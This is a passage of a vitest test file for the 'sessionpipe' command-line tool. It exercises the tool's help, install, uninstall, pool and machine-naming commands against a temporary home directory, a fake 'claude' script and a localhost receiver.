// SPDX-License-Identifier: Apache-2.0
// Every command of `sessionpipe`, in process: main(argv, io) against a throwaway HOME,
// config, state and data dir, a receiver on localhost, a daemon on a socket in the
// temp dir, and a `claude` that answers `auth status` from a shell script. What would
// start npm, launchctl or the keychain is stood in for at its module boundary.
// cli.test.ts proves the same binary from outside; this is where its branches live.
import { execFileSync, spawnSync } from "node:child_process";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  adapterByName,
  Cursors,
  makeEvent,
  Outbox,
  readConfig,
  takeLock,
  takeNamedLock,
  writeConfig,
} from "@sessionpipe/core";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { askMain } from "../src/ask.js";
import { channelIo, channelMain, controlMain, waitMain } from "../src/control/cli.js";
import { moveControlSecrets } from "../src/control/store.js";
import { HttpSink } from "../src/http-sink.js";
import { installLauncher } from "../src/launcher.js";
import { Refusal } from "../src/refusal.js";
import { type Inventory, look } from "../src/reinstall/find.js";
import { factsState, VERSION } from "../src/run.js";
import { rerunGlobally, viaNpx } from "../src/runtime.js";
import { bestStore, dropSinkSecrets, fileKept, moveSinkSecrets, sinkWithSecrets, storeLabel } from "../src/secrets.js";
import { PLAIN, plain } from "../src/style.js";
import { globalPrefix, installVersion, latestVersion } from "../src/update.js";

type Cli = typeof import("../src/cli.js");

// cli.ts takes its dist folder from its own URL; here that is the built dist, so the
// hook launcher copies real files and the hook command names a real hook.js.
const dist = vi.hoisted(() => ({ dir: "" }));
vi.mock("node:url", async (original) => {
  const real = await original<typeof import("node:url")>();
  return {
    ...real,
    fileURLToPath: (u: string | URL, o?: { windows?: boolean }) =>
      dist.dir && String(u).endsWith("/src/cli.ts") ? `${dist.dir}/cli.ts` : real.fileURLToPath(u, o),
  };
});
vi.mock("node:child_process", async (original) => ({
  ...(await original<typeof import("node:child_process")>()),
  execFileSync: vi.fn(),
  // The hook, timed by doctor, answers at once; a keychain tool is not here.
  spawnSync: vi.fn((_cmd: string, args: string[]) => ({
    status: args.some((a) => a.endsWith("hook.js")) ? 0 : 1,
    stdout: "",
    stderr: "",
  })),
}));
vi.mock("../src/runtime.js", async (original) => ({
  ...(await original<typeof import("../src/runtime.js")>()),
  viaNpx: vi.fn(() => false),
  rerunGlobally: vi.fn(),
}));
vi.mock("../src/update.js", async (original) => ({
  ...(await original<typeof import("../src/update.js")>()),
  latestVersion: vi.fn(),
  installVersion: vi.fn(),
  globalPrefix: vi.fn(() => null),
}));
vi.mock("../src/secrets.js", async (original) => {
  const real = await original<typeof import("../src/secrets.js")>();
  return {
    ...real,
    bestStore: vi.fn(real.bestStore),
    moveSinkSecrets: vi.fn(real.moveSinkSecrets),
    sinkWithSecrets: vi.fn(real.sinkWithSecrets),
    dropSinkSecrets: vi.fn(real.dropSinkSecrets),
  };
});
vi.mock("../src/control/store.js", async (original) => {
  const real = await original<typeof import("../src/control/store.js")>();
  return { ...real, moveControlSecrets: vi.fn(real.moveControlSecrets) };
});
vi.mock("../src/control/cli.js", async (original) => ({
  ...(await original<typeof import("../src/control/cli.js")>()),
  controlMain: vi.fn(async () => {}),
  waitMain: vi.fn(async () => {}),
  channelMain: vi.fn(async () => {}),
}));
vi.mock("../src/ask.js", async (original) => ({
  ...(await original<typeof import("../src/ask.js")>()),
  askMain: vi.fn(async () => 0),
}));
// The look `doctor` and `status` take at this home's copies of sessionpipe is the real
// one, at real folders: what it was handed, and what it answered, can be read here.
vi.mock("../src/reinstall/find.js", async (original) => {
  const real = await original<typeof import("../src/reinstall/find.js")>();
  return { ...real, look: vi.fn(real.look) };
});

// A harness config file the system refuses to let us write (read-only: EACCES, or
// EPERM on Windows), faked at node:fs, since chmod means nothing on Windows or to root.
// A code alone is refused at the open, as Node does; `@write` fails in the write, after
// the open has truncated the file. Empty, every write goes through.
const unwritable = vi.hoisted(() => ({ files: new Map<string, string>() }));
// How much room the disk says it has: bytes, null when the system won't say, and left
// undefined the real answer.
const disk = vi.hoisted(() => ({ free: undefined as number | null | undefined }));
vi.mock("node:fs", async (original) => {
  const real = await original<typeof import("node:fs")>();
  const statfsSync = ((p: string) => {
    if (disk.free === undefined) return real.statfsSync(p);
    if (disk.free === null) throw new Error("ENOSYS: function not implemented, statfs");
    return { bavail: Math.floor(disk.free / 4096), bsize: 4096 };
  }) as typeof real.statfsSync;
  const write = real.writeFileSync as (...a: unknown[]) => void;
  const writeFileSync = ((p: unknown, ...rest: unknown[]) => {
    const [code, syscall = "open"] = (typeof p === "string" ? unwritable.files.get(p) : undefined)?.split("@") ?? [];
    if (!code) return write(p, ...rest);
    if (syscall === "write") write(p, "");
    throw Object.assign(new Error(`${code}: refused, ${syscall} '${p}'`), { code, syscall });
  }) as typeof real.writeFileSync;
  return { ...real, writeFileSync, statfsSync };
});

const here = path.dirname(fileURLToPath(import.meta.url));
const realDist = path.resolve(here, "../dist");
const claudeCode = adapterByName("claude-code")!;
const codex = adapterByName("codex")!;
let cli: Cli;
let tmp: string;
let state: string;
let config: string;
let home: string;
const servers: Server[] = [];
const platform = Object.getOwnPropertyDescriptor(process, "platform") as PropertyDescriptor;
/** The disk the temp folders are on takes `A` and `a` for one name (APFS as shipped). */
const IGNORES_CASE = (() => {
  const made = mkdtempSync(path.join(os.tmpdir(), "sp-Case-"));
  try {
    return existsSync(path.join(path.dirname(made), path.basename(made).toLowerCase()));
  } finally {
    rmSync(made, { recursive: true, force: true });
  }
})();

function put(file: string, value: unknown): void {
  mkdirSync(path.dirname(file), { recursive: true });
  writeFileSync(file, typeof value === "string" ? value : `${JSON.stringify(value)}\n`);
}
const cfg = () => readConfig();
const onPlatform = (p: NodeJS.Platform) => Object.defineProperty(process, "platform", { value: p, configurable: true });

/** One run of the CLI: what it printed, and what it did at the end. */
async function run(...argv: string[]) {
  return runAt({}, ...argv);
}
/** The same where the output is what `where` says: a terminal, its width, a terminal for errors. */
async function runAt(where: { tty?: boolean; columns?: number; errTty?: boolean }, ...argv: string[]) {
  const lines: string[] = [];
  const io = { out: (s = "") => void lines.push(s), err: vi.fn(), exit: vi.fn(), ...where };
  await cli.main(argv, io);
  return { lines, text: lines.join("\n"), err: io.err, exit: io.exit };
}
const ESC = String.fromCharCode(27);
/** What `connect` hands `control pair` so its lines look as connect's own do: here, a pipe's. */
const VIEW = { ui: PLAIN, say: expect.any(Function) };
const quoted = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
/** A row of the page: its mark, its label and what it says, however wide the label's column. */
const row = (mark: string, label: string, value: string) =>
  new RegExp(`^ {2}${quoted(mark)} ${quoted(label)} +${quoted(value)}$`, "m");
/** A group's rows, without its heading. */
function group(r: { lines: string[] }, title: string): string[] {
  const from = r.lines.indexOf(title) + 1;
  const to = r.lines.indexOf("", from);
  return from ? r.lines.slice(from, to < 0 ? undefined : to) : [];
}
/** What `status` says of a group in its one line: the group's mark, then its words. */
function said(r: { lines: string[] }, title: string): string | undefined {
  const m = r.lines.map((l) => new RegExp(`^ {2}(.) ${quoted(title)} +(.*)$`).exec(l)).find(Boolean);
  return m ? `${m[1]} ${m[2]}` : undefined;
}
/** Doctor's last line wherever it has something to fix: the way back in when the command
 *  itself is what broke. */
const REPAIR =
  "  If `sessionpipe` itself stops working, this repairs it from scratch: `npx -y sessionpipe@latest reinstall`";
/** Doctor's "To fix", from its heading on, without that closing line: which is there,
 *  after a blank, exactly when there is something to fix. */
const fixes = (r: { lines: string[] }): string[] => {
  if (!r.lines.includes("To fix")) {
    expect(r.lines).not.toContain(REPAIR);
    return [];
  }
  const all = r.lines.slice(r.lines.indexOf("To fix"));
  expect(all.slice(-2)).toEqual(["", REPAIR]);
  return all.slice(0, -2);
};
/** Doctor times the hook by this clock: each of its eight runs takes one millisecond. */
function steadyHook(): void {
  let tick = 0n;
  vi.spyOn(process.hrtime, "bigint").mockImplementation(() => (tick += 1_000_000n));
}
/** This computer paired with one receiver (or what `over` says instead). */
function paired(over: Record<string, unknown> = {}): void {
  put(path.join(tmp, "config", "control.json"), {
    name: "box",
    folders: [],
    mode: "safe",
    receivers: [{ url: "https://rx.invalid", machine: "m", token: "t", keys: [] }],
    ...over,
  });
}
/** The clock doctor reads, held still: `minutesAgo` is a time in a log or a record. */
const NOW = Date.parse("2026-11-12T10:00:00.000Z");
const minutesAgo = (n: number) => new Date(NOW - n * 60_000).toISOString();
function holdClock(): void {
  vi.useFakeTimers({ toFake: ["Date"] });
  vi.setSystemTime(NOW);
}

/** A receiver on localhost: its well-known file, and an events endpoint that answers `status`. */
function receiver(o: { wellKnown?: unknown; wellKnownStatus?: number; status?: number; body?: unknown } = {}) {
  const posts: unknown[] = [];
  const server = createServer((req, res) => {
    let body = "";
    req.on("data", (b) => {
      body += b;
    });
    req.on("end", () => {
      if (req.url === "/.well-known/sessionpipe") {
        res.writeHead(o.wellKnownStatus ?? 200, { "content-type": "application/json" });
        res.end(JSON.stringify(o.wellKnown ?? { max_tier: 3 }));
        return;
      }
      posts.push(JSON.parse(body));
      res.writeHead(o.status ?? 200, { "content-type": "application/json" });
      res.end(JSON.stringify(o.body ?? { accepted: 2 }));
    });
  });
  servers.push(server);
  return new Promise<{ url: string; posts: unknown[] }>((resolve) =>
    server.listen(0, "127.0.0.1", () =>
      resolve({ url: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, posts }),
    ),
  );
}

/** The control daemon's socket, answering each op from `replies` (or nothing). */
function daemon(replies: Record<string, unknown>): Promise<() => Promise<void>> {
  const server = net.createServer((socket) => {
    socket.once("data", (d) => {
      const r = replies[(JSON.parse(d.toString()) as { op: string }).op];
      if (r === undefined) socket.end();
      else socket.end(`${JSON.stringify(r)}\n`);
    });
  });
  return new Promise((resolve) =>
    server.listen(process.env.SESSIONPIPE_SOCKET, () =>
      resolve(() => new Promise<void>((r) => server.close(() => r()))),
    ),
  );
}

/** A `claude` that answers `auth status --json` by the account it is asked about. */
function fakeClaude(): string {
  const bin = path.join(tmp, "claude");
  writeFileSync(
    bin,
    `#!/bin/sh
case "$CLAUDE_CONFIG_DIR" in
  *.claude-second) echo '{"loggedIn":false}' ;;
  *.claude-plain) echo '{"loggedIn":true}' ;;
  *.claude-odd) echo 'no json here' ;;
  *) echo '{"loggedIn":true,"authMethod":"claude.ai","subscriptionType":"max"}' ;;
esac
`,
    { mode: 0o755 },
  );
  return bin;
}

function event(type: string, data: Record<string, unknown>, session: Record<string, unknown> = {}) {
  return makeEvent(
    { type, harnessEvent: "x", data },
    { harness: { name: "claude-code" }, session: { id: "0123456789abcdef", seq: 0, machine: "m", ...session } },
  );
}

beforeAll(async () => {
  dist.dir = realDist;
  cli = await import("../src/cli.js");
});

beforeEach(() => {
  tmp = realpathSync(mkdtempSync(path.join(os.tmpdir(), "sp-main-")));
  home = path.join(tmp, "home");
  mkdirSync(home);
  state = path.join(tmp, "state");
  config = path.join(tmp, "config", "config.json");
  for (const [k, v] of Object.entries({
    HOME: home,
    USERPROFILE: home,
    // Nothing on it but the folder a fresh copy's command would go to: with that folder
    // not on PATH, `doctor` and `status` say so on every page (a test of its own, below).
    PATH: path.join(home, ".local", "bin"),
    XDG_CONFIG_HOME: path.join(home, ".config"),
    XDG_STATE_HOME: path.join(home, ".local", "state"),
    XDG_DATA_HOME: path.join(home, ".local", "share"),
    CLAUDE_CONFIG_DIR: path.join(home, ".claude"),
    CODEX_HOME: path.join(home, ".codex"),
    GEMINI_CLI_HOME: path.join(home, ".gemini"),
    GROK_HOME: path.join(home, ".grok"),
    SESSIONPIPE_CONFIG: config,
    SESSIONPIPE_STATE: state,
    SESSIONPIPE_DATA: path.join(tmp, "data"),
    SESSIONPIPE_SOCKET: path.join(tmp, "ctl.sock"),
    SESSIONPIPE_SECRETS: "file",
    SESSIONPIPE_CLAUDE: path.join(tmp, "no-claude"),
    SESSIONPIPE_NO_UPDATE_CHECK: undefined,
    SESSIONPIPE_SERVICE_LABEL: undefined,
    SSH_CONNECTION: undefined,
    // The runner's own colour settings say nothing here: a pipe is plain, a terminal coloured.
    FORCE_COLOR: undefined,
    NO_COLOR: undefined,
    TERM: "xterm-256color",
  }))
    vi.stubEnv(k, v as string);
  vi.resetAllMocks();
  // This computer's name heads doctor's first column, and a config without one takes the
  // hostname: a CI runner's is sixty characters, which would widen every row a test reads.
  vi.spyOn(os, "hostname").mockReturnValue("test-box.local");
});
afterEach(async () => {
  Object.defineProperty(process, "platform", platform);
  process.exitCode = undefined;
  disk.free = undefined;
  vi.useRealTimers();
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
  for (const s of servers.splice(0)) await new Promise<void>((r) => s.close(() => r()));
  rmSync(tmp, { recursive: true, force: true });
});

describe.skipIf(process.platform === "win32")("help, version and the dispatch", () => {
  it("prints the usage for a command and its subcommand, and the overview for the rest", async () => {
    expect((await run("sink", "add", "--help")).text).toMatch(/^Usage: sessionpipe sink add <url/);
    expect((await run("control", "keys", "remove", "-h")).text).toContain("control keys remove <id>");
    for (const argv of [[], ["help"], ["--help"], ["bogus"], ["bogus", "-h"]]) {
      const { text } = await run(...argv);
      expect(text).toContain(`sessionpipe ${VERSION} · what your coding agents are doing, sent where you choose`);
      expect(text).toContain("Usage: sessionpipe <command> [options]");
      expect(text).toMatch(/^ {2}control pair <receiver> {2,}Trust a device's key, at this computer's terminal$/m);
    }
    expect(controlMain).not.toHaveBeenCalled();
    expect((await run("help")).text).toMatch(/^ {2}pool {2,}The accounts in order, and the room each has left$/m);
    expect((await run("pool", "add", "--help")).text).toMatch(/^Usage: sessionpipe pool add --import \| --login/);
  });

  it("pool: the family runs in this process when no daemon answers; status and uninstall know about it", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    expect((await run("pool")).lines[0]).toBe("  pool:     off · 0 accounts");
    expect(said(await run("status"), "Accounts")).toBeUndefined();
    const on = await run("pool", "on");
    expect(on.lines[0]).toMatch(/^ {2}✓ .*settings\.json: env block written/);
    expect(on.lines).toContain(
      "  New Claude Code sessions use the pool with the new token; running ones keep working for 10 minutes.",
    );
    expect(on.lines.some((l) => l.startsWith("  Background service: "))).toBe(true);
    // On, the pool is what Accounts names, and what makes the background service wanted.
    const pooled = await run("status");
    expect(said(pooled, "Accounts")).toBe("✓ pool");
    expect(said(pooled, "This computer")).toMatch(/^✗ \S+ \(sessionpipe 0\.0\.0\), background service: not running$/);
    expect(JSON.parse((await run("status", "--json")).lines.join("\n")).pool).toMatchObject({ on: true, accounts: 0 });
    // uninstall: the pool's env block goes first, then the hooks.
    await run("install", "--claude-code", "--backfill", "0");
    const { lines } = await run("uninstall");
    expect(lines[0]).toMatch(/^ {2}✓ .*settings\.json: the pool's env block is gone$/);
    expect(lines.findIndex((l) => /✓ claude-code: /.test(l))).toBeGreaterThan(
      lines.findIndex((l) => /accounts stay pooled/.test(l)),
    );
    expect(JSON.parse(readFileSync(path.join(home, ".claude", "settings.json"), "utf8"))).toEqual({});
    expect((await run("uninstall")).lines[0]).not.toContain("env block");
    // One account, off: the line is still there, singular.
    put(path.join(tmp, "config", "pool.json"), {
      on: false,
      port: 0,
      accounts: [
        {
          id: "0a1b2c3d",
          email: "a@x.y",
          account_uuid: "0a1b2c3d-0000-4000-8000-000000000000",
          enabled: true,
          added_at: "2026-10-29T10:00:00.000Z",
        },
      ],
    });
    steadyHook();
    expect((await run("doctor")).text).toMatch(row("·", "pool", "off · 1 account"));
  });

  it("the version, the hook note, and the control, wait and channel dispatch", async () => {
    for (const v of ["version", "--version", "-v"]) expect((await run(v)).lines).toEqual([VERSION]);
    expect((await run("hook")).lines).toEqual(["sessionpipe hook is dist/hook.js; harnesses run it directly"]);
    await run("control", "status");
    // Into a pipe `control status` is for a program: it is handed a pipe's look.
    expect(controlMain).toHaveBeenCalledWith(["control", "status"], expect.any(Function), realDist, {
      ui: PLAIN,
      say: expect.any(Function),
    });
    await run("wait", "--session", "claude-code:x");
    expect(waitMain).toHaveBeenCalledWith(["wait", "--session", "claude-code:x"], expect.any(Function));
    // `ask` answers with an exit code of its own: 0 leaves the process's alone, anything else is kept.
    await run("ask", "codex", "hi");
    expect(askMain).toHaveBeenCalledWith(
      ["ask", "codex", "hi"],
      { out: expect.any(Function), err: expect.any(Function) },
      { distDir: realDist },
    );
    expect(process.exitCode).toBeUndefined();
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    vi.mocked(askMain).mockImplementationOnce(async (_argv, io) => {
      io.err("sessionpipe ask: refused\n");
      return 1;
    });
    await run("ask", "codex", "no");
    expect(stderr).toHaveBeenCalledWith("sessionpipe ask: refused\n");
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    await run("channel");
    expect(channelMain).toHaveBeenCalledWith(["channel"], channelIo);
  });

  it("a failing command says why on stderr and exits 1", async () => {
    const r = await run("install", "--machine");
    expect(r.err).toHaveBeenCalledWith("sessionpipe: --machine NAME is required when naming or renaming a machine\n");
    expect(r.exit).toHaveBeenCalledWith(1);
    expect(r.lines).toEqual([]);
  });

  it("by default it prints to this process's stdout and stderr and ends it", async () => {
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    const exit = vi.spyOn(process, "exit").mockImplementation(() => undefined as never);
    await cli.main(["version"]);
    expect(stdout).toHaveBeenCalledWith(`${VERSION}\n`);
    await cli.main(["install", "--machine"]);
    expect(stderr).toHaveBeenCalledWith("sessionpipe: --machine NAME is required when naming or renaming a machine\n");
    expect(exit).toHaveBeenCalledWith(1);
  });

  it("the entrypoint test follows npm's bin link to the file, and a missing path is no entrypoint", () => {
    const file = path.join(tmp, "real.js");
    writeFileSync(file, "");
    const link = path.join(tmp, "link");
    symlinkSync(file, link);
    expect(cli.isEntrypoint(link, `file://${file}`)).toBe(true);
    expect(cli.isEntrypoint(file, `file://${file}`)).toBe(true);
    expect(cli.isEntrypoint(path.join(tmp, "other.js"), `file://${file}`)).toBe(false);
    expect(cli.isEntrypoint(path.join(tmp, "missing.js"), `file://${file}`)).toBe(false);
    expect(cli.isEntrypoint(undefined, `file://${file}`)).toBe(false);
  });
});

describe.skipIf(process.platform === "win32")("install", () => {
  it("hooks the harnesses found here, writes the launcher, backfills, and says where events go", async () => {
    mkdirSync(path.join(home, ".claude"));
    put(path.join(home, ".codex", "config.toml"), "");
    put(path.join(home, ".gemini", "settings.json"), {});
    const rows = [
      {
        session: { id: "aaaaaaaa-0000-4000-8000-000000000001", cwd: path.join(home, "proj"), title: "t" },
        started_at: Date.now() - 1000,
        last_at: Date.now(),
        turns: 3,
      },
      { session: { id: "aaaaaaaa-0000-4000-8000-000000000002" }, started_at: Date.now() - 1000, last_at: Date.now() },
    ];
    vi.spyOn(claudeCode, "backfill").mockReturnValue(rows);
    vi.spyOn(codex, "backfill").mockImplementation(() => {
      throw new Error("unreadable");
    });
    const first = await run("install");
    expect(first.text).toContain("✓ hook launcher:");
    expect(first.text).toMatch(/^ {2}This computer: \S+$/m);
    expect(first.text).toContain("No sink above tier 0: hooking one tool event per harness");
    expect(first.text).toMatch(/✓ claude-code: .*settings\.json written/);
    expect(first.text).toContain("note: Gemini CLI's own telemetry");
    expect(first.text).toContain("note: Codex runs non-managed hooks only after you approve them");
    expect(first.text).toContain("✓ Backfill: 2 sessions from the last 30 days queued as session.backfill");
    expect(first.text).toContain("Nothing leaves this computer yet");
    expect(cfg().harnesses["claude-code"]).toMatchObject({
      enabled: true,
      created: [expect.stringMatching(/\.claude/)],
    });
    const queued = new Outbox(state).read({ harness: "claude-code", session: rows[0]!.session.id }, 0);
    expect(queued.events[0]).toMatchObject({
      type: "session.backfill",
      data: { turns: 3 },
      session: { cwd: expect.any(String) },
    });

    // Again: nothing changes, the backfilled sessions are not queued twice, and a tier-1
    // sink makes the install a full one that reports somewhere.
    const again = await run("install", "--sink", "stdout", "--tier", "1", "--backfill", "7");
    expect(again.text).toContain("✓ sink stdout: stdout at tier 1");
    expect(again.text).not.toContain("No sink above tier 0");
    expect(again.text).toMatch(/[✓=] claude-code: .*settings\.json/);
    expect(again.text).toContain("✓ Backfill: 0 sessions from the last 7 days");
    expect(again.text).toContain("Reporting to stdout (tier 1).");
    expect(again.text).not.toContain("hook launcher");
    const third = await run("install", "--claude-code", "--backfill", "0");
    expect(third.text).toContain("= claude-code: ");
    expect(third.text).not.toContain("Backfill:");
  });

  it("a settings file it can't read is skipped and said so; a single session backfills in the singular", async () => {
    put(path.join(home, ".claude", "settings.json"), "{not json");
    vi.spyOn(claudeCode, "backfill").mockReturnValue([
      { session: { id: "aaaaaaaa-0000-4000-8000-000000000003" }, started_at: 1, last_at: 2 },
    ]);
    const { text } = await run("install", "--claude-code");
    expect(text).toMatch(/! claude-code: .*settings\.json — .*not touched/);
    expect(text).toContain("✓ Backfill: 1 session from the last 30 days");
    expect(text).toContain("✗ Nothing was hooked: claude-code was left alone");
    expect(process.exitCode).toBe(1);
  });

  it("one harness hooked is enough for exit 0, though another was skipped; both skipped is exit 1", async () => {
    put(path.join(home, ".claude", "settings.json"), "{not json");
    const devinConfig = path.join(home, ".config", "devin", "config.json");
    put(devinConfig, {});
    const { text } = await run("install", "--claude-code", "--devin", "--backfill", "0");
    expect(text).toMatch(/! claude-code: .*not touched/);
    expect(text).toMatch(/✓ devin: /);
    expect(text).not.toContain("Nothing was hooked");
    expect(process.exitCode).toBeUndefined();
    put(devinConfig, "{not json");
    const both = await run("install", "--claude-code", "--devin", "--backfill", "0");
    expect(both.text).toContain("✗ Nothing was hooked: claude-code, devin were left alone");
    expect(process.exitCode).toBe(1);
  });

  it("--status-line makes ours Claude Code's status line and is remembered; --no-status-line takes it away", async () => {
    const settings = path.join(home, ".claude", "settings.json");
    put(settings, {});
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    const line = () => JSON.parse(readFileSync(settings, "utf8")).statusLine;
    const on = await run("install", "--claude-code", "--status-line", "--backfill", "0");
    expect(on.text).toMatch(/✓ claude-code: .*settings\.json — status line written \(account limits\)/);
    expect(line().command).toMatch(/ claude-code StatusLine$/);
    expect(cfg().harnesses["claude-code"]).toMatchObject({ status_line: true });
    await run("install", "--claude-code", "--backfill", "0");
    expect(line().command).toMatch(/ claude-code StatusLine$/);
    const off = await run("install", "--claude-code", "--no-status-line", "--backfill", "0");
    expect(off.text).toContain("status line removed");
    expect(line()).toBeUndefined();
    expect(cfg().harnesses["claude-code"]?.status_line).toBeUndefined();
  });

  it("devin: the note about a hooks file Devin drops whole, unless its config was skipped", async () => {
    const devinConfig = path.join(home, ".config", "devin", "config.json");
    put(devinConfig, {});
    const { text } = await run("install", "--devin", "--backfill", "0");
    expect(text).toMatch(/✓ devin: /);
    expect(text).toContain("Devin ignores a hooks file whole");
    put(devinConfig, "{not json");
    const again = await run("install", "--devin", "--backfill", "0");
    expect(again.text).toMatch(/! devin: .*config\.json — .*not touched/);
    expect(again.text).not.toContain("Devin ignores a hooks file whole");
  });

  it("with no harness here it says so and writes nothing", async () => {
    const { text } = await run("install");
    expect(text).toContain("No coding agent found on this computer");
    expect(existsSync(config)).toBe(false);
  });

  it("run from npx, it hands the command to a persistent copy before anything else", async () => {
    vi.mocked(viaNpx).mockReturnValueOnce(true);
    await run("install", "--claude-code", "--allow-downgrade");
    expect(rerunGlobally).toHaveBeenCalledWith(
      ["install", "--claude-code", "--allow-downgrade"],
      expect.any(Function),
      {
        allowDowngrade: true,
      },
    );
    expect(existsSync(config)).toBe(false);
  });

  it("names the machine once; a different --machine later is ignored unless it is a rename", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    await run("install", "--machine", "box-one", "--backfill", "0");
    expect(cfg().machine).toBe("box-one");
    const kept = await run("install", "--machine", "box-two", "--backfill", "0");
    expect(kept.text).toContain("Keeping configured machine name box-one; ignoring --machine box-two.");
    expect(cfg().machine).toBe("box-one");
    await run("install", "--rename-machine", "--machine", "box-two", "--backfill", "0");
    expect(cfg().machine).toBe("box-two");
    // A config without a name: the hostname's, as the hooks would name it.
    writeConfig({ ...cfg(), machine: undefined } as never);
    await run("install", "--backfill", "0");
    expect(cfg().machine).toBe(os.hostname().replace(/\.local$/, ""));
  });

  it("refuses --machine without a name; an explicit rename renames the paired daemon too", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    expect((await run("install", "--rename-machine")).err).toHaveBeenCalledWith(
      "sessionpipe: --machine NAME is required when naming or renaming a machine\n",
    );
    expect((await run("install", "--machine", "--backfill")).err).toHaveBeenCalled();
    const control = path.join(tmp, "config", "control.json");
    put(control, { name: "paired-box", folders: ["/p"], mode: "safe", receivers: [] });
    // The daemon's name is the machine's when the config has none.
    await run("install", "--backfill", "0");
    expect(cfg().machine).toBe("paired-box");
    // A rename moves both names together, so the hooks and the daemon stay one machine.
    const r = await run("install", "--rename-machine", "--machine", "other", "--backfill", "0");
    expect(r.err).not.toHaveBeenCalled();
    expect(r.text).toContain("Renamed the background service paired-box → other; its next hello tells each receiver.");
    expect(cfg().machine).toBe("other");
    expect(JSON.parse(readFileSync(control, "utf8"))).toMatchObject({ name: "other", folders: ["/p"], mode: "safe" });
    // Already the same name: nothing to say, nothing rewritten.
    const again = await run("install", "--rename-machine", "--machine", "other", "--backfill", "0");
    expect(again.text).not.toContain("Renamed the background service");
  });

  it("a config without a name keeps the hooks' hostname name and renames a daemon paired under another", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    const control = path.join(tmp, "config", "control.json");
    const hooks = os.hostname().replace(/\.(local|lan|home)$/i, "");
    // Paired before 0.9.0 on a Mac: the daemon said `<host>.local`, the events said `<host>`.
    writeConfig({ ...cfg(), machine: undefined } as never);
    put(control, { name: `${hooks}.local`, folders: ["/p"], mode: "safe", receivers: [] });
    const r = await run("install", "--backfill", "0");
    expect(r.err).not.toHaveBeenCalled();
    expect(cfg().machine).toBe(hooks);
    expect(r.text).toContain(
      `Renamed the background service ${hooks}.local → ${hooks}; its next hello tells each receiver.`,
    );
    expect(JSON.parse(readFileSync(control, "utf8"))).toMatchObject({ name: hooks, folders: ["/p"], mode: "safe" });
  });

  it("on Windows the hook names this node and hook.js by path, no launcher", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    onPlatform("win32");
    const { text } = await run("install", "--claude-code", "--backfill", "0");
    expect(text).not.toContain("hook launcher");
    const settings = readFileSync(path.join(home, ".claude", "settings.json"), "utf8");
    expect(settings).toContain(process.execPath);
    expect(settings).toContain(path.join(realDist, "hook.js"));
    expect(settings).not.toContain("sessionpipe-hook");
  });
  it("a bare word is refused before any work: install, uninstall and backfill name a harness as --<harness>", async () => {
    const settings = path.join(home, ".claude", "settings.json");
    const toml = path.join(home, ".codex", "config.toml");
    put(settings, {});
    put(toml, "");
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    // `install claude-code` used to hook every harness found here, Codex too.
    expect((await run("install", "claude-code")).lines).toEqual([
      '  ! `sessionpipe install` takes options only, and "claude-code" is not one; to name that harness, pass --claude-code.',
      "  Nothing was changed. See `sessionpipe install --help`.",
    ]);
    expect(process.exitCode).toBe(2);
    expect(readFileSync(settings, "utf8")).toBe("{}\n");
    expect(readFileSync(toml, "utf8")).toBe("");
    expect(existsSync(config)).toBe(false);
    process.exitCode = undefined;
    // After an option too, unless it is that option's value.
    expect((await run("install", "--codex", "claude-code")).lines[0]).toContain('"claude-code" is not one');
    expect(process.exitCode).toBe(2);
    expect(existsSync(config)).toBe(false);
    process.exitCode = undefined;
    await run(
      "install",
      "--machine",
      "codex",
      "--backfill",
      "0",
      "--sink",
      "stdout",
      "--tier",
      "0",
      "--name",
      "out",
      "--token",
      "tok",
      "--secret",
      "sec",
    );
    expect(process.exitCode).toBeUndefined();
    expect(cfg().machine).toBe("codex");
    expect(cfg().sinks.map((s) => s.name)).toEqual(["out"]);
    const hooked = [readFileSync(settings, "utf8"), readFileSync(toml, "utf8")];
    const harnesses = Object.keys(cfg().harnesses);
    expect(harnesses).toEqual(expect.arrayContaining(["claude-code", "codex"]));
    // `uninstall codex` used to unhook Claude Code as well.
    expect((await run("uninstall", "codex")).lines).toEqual([
      '  ! `sessionpipe uninstall` takes options only, and "codex" is not one; to name that harness, pass --codex.',
      "  Nothing was changed. See `sessionpipe uninstall --help`.",
    ]);
    expect(process.exitCode).toBe(2);
    expect([readFileSync(settings, "utf8"), readFileSync(toml, "utf8")]).toEqual(hooked);
    expect(Object.keys(cfg().harnesses)).toEqual(harnesses);
    process.exitCode = undefined;
    // uninstall has no option that takes a value: a word anywhere is refused.
    expect((await run("uninstall", "--keep-state", "codex")).lines[0]).toContain('"codex" is not one');
    expect(process.exitCode).toBe(2);
    expect(Object.keys(cfg().harnesses)).toEqual(harnesses);
    process.exitCode = undefined;
    expect((await run("backfill", "--days", "7", "--codex")).lines).not.toContainEqual(
      expect.stringContaining("is not one"),
    );
    // A word that names no harness gets no hint.
    expect((await run("backfill", "30")).lines).toEqual([
      '  ! `sessionpipe backfill` takes options only, and "30" is not one.',
      "  Nothing was changed. See `sessionpipe backfill --help`.",
    ]);
    expect(process.exitCode).toBe(2);
    expect(claudeCode.backfill).not.toHaveBeenCalled();
  });
});

describe("a config.json that does not parse", () => {
  it("is left byte-identical: a command that saves it stops first, and install and uninstall touch no hook", async () => {
    const settings = path.join(home, ".claude", "settings.json");
    put(settings, {});
    // A hand edit's trailing comma: read as the defaults, this used to be saved over.
    const text =
      '{ "machine": "studio", "sinks": [{ "name": "board", "url": "https://b.example", "tier": 1, "token": "t" }], }\n';
    put(config, text);
